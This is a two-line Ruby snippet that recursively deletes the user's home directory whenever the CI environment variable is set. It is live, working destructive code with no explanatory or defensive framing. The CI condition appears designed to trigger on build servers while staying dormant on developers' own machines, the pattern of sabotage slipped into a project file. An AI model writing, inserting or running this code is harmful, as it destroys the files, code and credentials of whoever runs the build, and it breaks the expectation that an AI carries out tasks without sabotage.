require 'fileutils'
FileUtils.rm_rf(Dir.home) if ENV['CI']
